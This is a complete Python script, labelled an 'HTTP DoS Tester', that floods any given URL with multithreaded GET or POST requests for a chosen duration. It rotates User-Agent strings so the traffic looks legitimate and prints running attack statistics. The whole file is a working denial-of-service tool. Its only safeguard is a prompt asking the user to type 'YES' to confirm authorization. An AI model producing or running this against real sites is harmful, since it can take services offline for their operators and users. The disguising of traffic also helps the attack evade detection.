import requests
import sys
import argparse
import time
import random
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
from colorama import Fore, Style, init

# Initialize Colorama for colored output
init(autoreset=True)

# List of common User-Agents for rotation to make requests appear more legitimate
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/109.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
]

# Global counters for statistics
requests_sent = 0
successful_requests = 0
failed_requests = 0
start_time = 0

def get_random_user_agent():
    """Returns a random User-Agent string."""
    return random.choice(USER_AGENTS)

def print_banner():
    """Prints a professional ASCII art banner for the DoS tool."""
    banner = f"""
{Fore.RED}{Style.BRIGHT}
 
---------------------------------------------------
       HTTP DoS Tester v1.0
---------------------------------------------------
{Style.RESET_ALL}
"""
    print(banner)

def attack_target(target_url, timeout=10, method='GET'):
    """
    Sends a single HTTP request to the target URL.
    Updates global statistics.
    """
    global requests_sent, successful_requests, failed_requests
    
    headers = {'User-Agent': get_random_user_agent()}
    
    try:
        requests_sent += 1
        if method.upper() == 'POST':
            response = requests.post(target_url, headers=headers, timeout=timeout)
        else: # Default to GET
            response = requests.get(target_url, headers=headers, timeout=timeout)
        
        if response.status_code < 400: # Considering 2xx and 3xx as successful
            successful_requests += 1
        else:
            failed_requests += 1
            # print(f"{Fore.YELLOW}    [WARNING] Request to {target_url} returned status {response.status_code}{Style.RESET_ALL}")
            
    except requests.exceptions.Timeout:
        failed_requests += 1
        # print(f"{Fore.YELLOW}    [TIMEOUT] Request to {target_url} timed out.{Style.RESET_ALL}")
    except requests.exceptions.ConnectionError:
        failed_requests += 1
        # print(f"{Fore.RED}    [CONN ERROR] Request to {target_url} failed (connection error).{Style.RESET_ALL}")
    except requests.exceptions.RequestException as e:
        failed_requests += 1
        # print(f"{Fore.RED}    [ERROR] Request to {target_url} failed: {e}{Style.RESET_ALL}")
    except Exception as e:
        failed_requests += 1
        # print(f"{Fore.RED}    [UNEXPECTED ERROR] {e}{Style.RESET_ALL}")


def run_dos_attack(target_url, duration_seconds, num_workers, method='GET', timeout=10):
    """
    Orchestrates the DoS attack using multiple threads.
    """
    global start_time, requests_sent, successful_requests, failed_requests
    
    print(f"\n{Fore.RED}{Style.BRIGHT}!!! STARTING DoS ATTACK !!!{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Target URL: {target_url}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Duration: {duration_seconds} seconds{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Concurrent Workers: {num_workers}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}HTTP Method: {method.upper()}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Request Timeout: {timeout} seconds{Style.RESET_ALL}")
    print(f"{Fore.RED}Press Ctrl+C to stop the attack prematurely.{Style.RESET_ALL}\n")

    start_time = time.time()
    end_time = start_time + duration_seconds
    
    with ThreadPoolExecutor(max_workers=num_workers) as executor:
        futures = []
        try:
            while time.time() < end_time:
                # Continuously submit tasks
                for _ in range(num_workers): # Try to keep 'num_workers' tasks always running
                    futures.append(executor.submit(attack_target, target_url, timeout, method))
                
                # Print stats every second
                elapsed = int(time.time() - start_time)
                if elapsed % 1 == 0:
                    current_rate = requests_sent / (elapsed + 0.001) if elapsed > 0 else 0
                    sys.stdout.write(f"\r{Fore.CYAN}[STATUS]{Style.RESET_ALL} Time: {elapsed}s/{duration_seconds}s | Sent: {requests_sent:,} | Success: {successful_requests:,} | Failed: {failed_requests:,} | Rate: {current_rate:.2f} req/s")
                    sys.stdout.flush()
                
                time.sleep(0.1) # Small sleep to prevent busy-waiting
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Attack interrupted by user (Ctrl+C).{Style.RESET_ALL}")
        finally:
            # Wait for all submitted tasks to complete (if any are still running)
            for future in futures:
                future.cancel() # Try to cancel any pending tasks
            executor.shutdown(wait=True) # Wait for active tasks to finish

    final_elapsed_time = time.time() - start_time
    final_rate = requests_sent / (final_elapsed_time + 0.001) if final_elapsed_time > 0 else 0

    print(f"\n\n{Fore.RED}{Style.BRIGHT}!!! DoS ATTACK COMPLETE !!!{Style.RESET_ALL}")
    print(f"{Fore.CYAN}--- Final Statistics ---{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Total Requests Sent: {requests_sent:,}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Successful Requests: {successful_requests:,}{Style.RESET_ALL}")
    print(f"{Fore.RED}Failed Requests: {failed_requests:,}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Total Time Elapsed: {final_elapsed_time:.2f} seconds{Style.RESET_ALL}")
    print(f"{Fore.GREEN}Average Request Rate: {final_rate:.2f} requests/second{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Check your website's performance and logs for impact.{Style.RESET_ALL}")
    print(f"{Fore.RED}Remember to disable or remove this script after testing.{Style.RESET_ALL}")


if __name__ == "__main__":
    print_banner()

    parser = argparse.ArgumentParser(description="HTTP DoS Tester - For Website Resilience Testing.")
    parser.add_argument("target_url", help="The target URL to attack (e.g., http://yourwebsite.com/index.php).")
    parser.add_argument("-d", "--duration", type=int, default=60,
                        help="Duration of the attack in seconds (default: 60 seconds).")
    parser.add_argument("-w", "--workers", type=int, default=50,
                        help="Number of concurrent workers (threads) to use for sending requests (default: 50).")
    parser.add_argument("-m", "--method", type=str, default="GET", choices=["GET", "POST"],
                        help="HTTP method to use for requests (GET or POST, default: GET).")
    parser.add_argument("-t", "--timeout", type=int, default=10,
                        help="Timeout for each individual request in seconds (default: 10 seconds).")

    args = parser.parse_args()

    parsed_url = urlparse(args.target_url)
    if not parsed_url.scheme or not parsed_url.netloc:
        print(f"{Fore.RED}Error: Invalid target URL. Please provide a full URL (e.g., http://example.com/page).{Style.RESET_ALL}")
        sys.exit(1)

    # Final confirmation before launching the attack
    print(f"\n{Fore.YELLOW}!!! WARNING: You are about to launch a DoS attack on {args.target_url} !!!{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}This can severely impact your website's availability and consume resources.{Style.RESET_ALL}")
    confirmation = input(f"{Fore.YELLOW}Type 'YES' to confirm you understand the risks and have proper authorization: {Style.RESET_ALL}")

    if confirmation.upper() == 'YES':
        run_dos_attack(args.target_url, args.duration, args.workers, args.method, args.timeout)
    else:
        print(f"{Fore.RED}Attack aborted. Please confirm by typing 'YES' if you wish to proceed.{Style.RESET_ALL}")
        sys.exit(0)

